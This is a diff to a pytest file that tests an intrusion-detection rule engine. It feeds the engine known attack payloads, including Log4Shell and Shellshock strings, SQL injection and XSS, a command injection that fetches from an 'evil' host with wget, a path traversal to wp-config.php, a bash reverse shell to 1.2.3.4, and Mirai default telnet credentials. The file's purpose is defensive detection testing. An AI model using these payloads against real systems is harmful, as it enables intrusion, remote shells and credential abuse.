@@ -93,8 +93,42 @@ def test_engine_reload_swaps_rules(tmp_path):
     assert [r.id for r in eng.evaluate("tcp", 1, 2, b"bbb")] == ["B"]
 
 
-def test_default_ruleset_loads():
+def default_engine():
     from pathlib import Path
     path = Path(__file__).resolve().parent.parent / "rules" / "default.rules.json"
-    rs = RuleSet.load(path)
-    assert len(rs) >= 10
+    return Engine(RuleSet.load(path))
+
+
+def test_default_ruleset_loads():
+    assert default_engine().rule_count >= 10
+
+
+def test_default_ruleset_ids_unique():
+    eng = default_engine()
+    ids = [r.id for r in eng.ruleset.rules]
+    assert len(ids) == len(set(ids))
+
+
+@pytest.mark.parametrize("proto,sport,dport,payload,expected", [
+    ("tcp", 5, 80, b"GET /?x=${jndi:ldap://h/a} HTTP/1.1\r\n", "EXP-LOG4SHELL-JNDI"),
+    ("tcp", 5, 80, b"User-Agent: () { :;}; /bin/id\r\n", "EXP-SHELLSHOCK"),
+    ("tcp", 5, 80, b"/login?u=1' or '1'='1", "WEB-SQLI-BOOLEAN"),
+    ("tcp", 5, 80, b"/?id=1;sleep(5)", "WEB-SQLI-TIME"),
+    ("tcp", 5, 80, b"/?q=<script>alert(1)</script>", "WEB-XSS-SCRIPT-TAG"),
+    ("tcp", 5, 80, b"/?x=;wget http://evil/x", "WEB-CMD-INJECTION"),
+    ("tcp", 5, 80, b"GET /../wp-config.php HTTP/1.1", "WEB-SENSITIVE-FILE"),
+    ("tcp", 5, 9001, b"bash -i >& /dev/tcp/1.2.3.4/9001 0>&1", "MAL-REVERSE-SHELL"),
+    ("tcp", 5, 3333, b'{"method":"mining.subscribe"}', "C2-MINING-STRATUM"),
+    ("tcp", 5, 23, b"root\r\nxc3511\r\n", "MAL-MIRAI-TELNET-CREDS"),
+    ("tcp", 5, 80, b"User-Agent: sqlmap/1.7\r\n", "RECON-SQLMAP-UA"),
+    ("tcp", 5, 80, b"User-Agent: gobuster/3.6\r\n", "RECON-DIRBUSTER-UA"),
+])
+def test_default_ruleset_detects_known_attacks(proto, sport, dport, payload, expected):
+    hits = {r.id for r in default_engine().evaluate(proto, sport, dport, payload)}
+    assert expected in hits
+
+
+def test_default_ruleset_quiet_on_benign_http():
+    eng = default_engine()
+    benign = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
+    assert eng.evaluate("tcp", 44000, 80, benign) == []
